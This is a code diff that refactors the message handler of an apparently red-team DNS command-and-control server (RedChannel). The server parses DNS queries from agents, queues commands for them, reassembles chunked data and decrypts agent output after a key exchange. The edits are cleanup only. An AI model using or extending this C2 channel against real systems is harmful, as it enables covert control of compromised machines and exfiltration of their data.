@@ -18,6 +18,7 @@ const rc = new RedChannel(c2_message_handler);
 const RedChannelUI = require("./lib/ui.js");
 const ui = new RedChannelUI(rc, crypto);
 rc.ui = ui;
+rc.app_root = __dirname;
 
 const cli = require("commander");
 cli.version(RC_VERSION, "-v, --version")
@@ -186,29 +187,25 @@ function c2_message_handler(req, res) {
             data: rc.config.static_dns[hostname],
             ttl: ttl,
         });
-        res.end();
-        return;
+        return res.end();
     }
 
     if (!hostname.endsWith(rc.config.c2.domain)) {
         ui.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
-        res.end();
-        return;
+        return res.end();
     }
     ui.debug(util.format("c2: %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name));
 
     if (question.type !== "AAAA" && question.type !== "PROXY") {
         ui.debug(util.format("c2: ignoring non-AAAA/non-PROXY query %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name));
-        res.end();
-        return;
+        return res.end();
     }
 
     var segments = hostname.slice(0, hostname.length - rc.config.c2.domain.length).split(".");
     if (segments.length < EXPECTED_DATA_SEGMENTS) {
         ui.error(util.format("c2: invalid message, not enough data segments (%d, expected %d): %s", segments.length, EXPECTED_DATA_SEGMENTS, hostname));
 
-        res.end();
-        return;
+        return res.end();
     }
 
     // used to prevent flooding
@@ -231,10 +228,9 @@ function c2_message_handler(req, res) {
     try {
         command = parseInt(segments[2].slice(0, 2), 16);
     } catch (ex) {
-        ui.error(`c2: failed to parse command: ${ex.toString()}`);
+        ui.error(`c2: failed to parse command: ${ex.message}`);
 
-        res.end();
-        return;
+        return res.end();
     }
 
     // no need to check the incoming data, just send a queued up msg
@@ -250,8 +246,7 @@ function c2_message_handler(req, res) {
                 ttl: ttl,
             });
 
-            res.end();
-            return;
+            return res.end();
         }
 
         // we have already responded to this agent and rand_id combination
@@ -264,8 +259,7 @@ function c2_message_handler(req, res) {
 
             ui.warn(`c2: ignoring flood from agent: ${chalk.blue(agent_id)}, rid: ${rand_id}, command: ${command}`);
 
-            res.end();
-            return;
+            return res.end();
         }
 
         ui.debug(`agent ${chalk.blue(agent_id)} checking in, sending next queued command`);
@@ -284,8 +278,7 @@ function c2_message_handler(req, res) {
             delete rc.agents[agent_id].ignore[rand_id];
         }, FLOOD_PROTECTION_TIMEOUT);
 
-        res.end();
-        return;
+        return res.end();
     }
 
     var current_chunk = 0;
@@ -313,9 +306,9 @@ function c2_message_handler(req, res) {
         };
     }
 
-    rc.agents[agent_id].recvq[command][data_id]["chunks"][current_chunk] = chunk;
-    if (rc.count_data_chunks(rc.agents[agent_id].recvq[command][data_id]["chunks"]) == total_chunks) {
-        data_to_process = rc.agents[agent_id].recvq[command][data_id]["chunks"].join("");
+    rc.agents[agent_id].recvq[command][data_id].chunks[current_chunk] = chunk;
+    if (rc.count_data_chunks(rc.agents[agent_id].recvq[command][data_id].chunks) == total_chunks) {
+        data_to_process = rc.agents[agent_id].recvq[command][data_id].chunks.join("");
         delete rc.agents[agent_id].recvq[command][data_id];
 
         // process data, send back status (0f = failed, 02 = success)
@@ -329,8 +322,7 @@ function c2_message_handler(req, res) {
             });
         }
 
-        res.end();
-        return;
+        return res.end();
     }
 
     // last byte 01 indicates more data is expected
@@ -348,8 +340,7 @@ function c2_message_handler(req, res) {
     if (question.type == 'A') {
         res.answer.push({ name: hostname, type: 'A', data: "1.1.1." + length, 'ttl': ttl })
     }*/
-    res.end();
-    return;
+    return res.end();
 }
 
 /**
@@ -375,7 +366,7 @@ function process_dns_data(agent_id, command, data) {
             try {
                 rc.agents[agent_id].keyx = crypto.import_uncompressed_pubkey(agent_pubkey);
             } catch (ex) {
-                ui.error(`cannot import key for ${chalk.blue(agent_id)}: ${ex.toString()}`);
+                ui.error(`cannot import key for ${chalk.blue(agent_id)}: ${ex.message}`);
                 break;
             }
             ui.success(`agent(${chalk.blue(agent_id)}) keyx: ${rc.agents[agent_id].keyx.asPublicECKey().toString("spki")}`);
@@ -383,7 +374,7 @@ function process_dns_data(agent_id, command, data) {
             try {
                 rc.agents[agent_id].secret = crypto.derive_secret(rc.agents[agent_id].keyx, rc.master_password);
             } catch (ex) {
-                ui.error(`cannot derive secret for ${chalk.blue(agent_id)}: ${ex.toString()}`);
+                ui.error(`cannot derive secret for ${chalk.blue(agent_id)}: ${ex.message}`);
                 break;
             }
             ui.success(`agent(${chalk.blue(agent_id)}) secret: ${rc.agents[agent_id].secret.toString("hex")}`);
@@ -395,7 +386,7 @@ function process_dns_data(agent_id, command, data) {
             try {
                 plaintext = decrypt_dns_message(agent_id, data);
             } catch (ex) {
-                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${ex.toString()}`);
+                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${ex.message}`);
                 break;
             }
             ui.success(`agent(${chalk.blue(agent_id)}) output>\n ${plaintext.toString()}`);
@@ -404,7 +395,7 @@ function process_dns_data(agent_id, command, data) {
             try {
                 plaintext = decrypt_dns_message(agent_id, data);
             } catch (ex) {
-                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${ex.toString()}`);
+                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${ex.message}`);
                 break;
             }
 
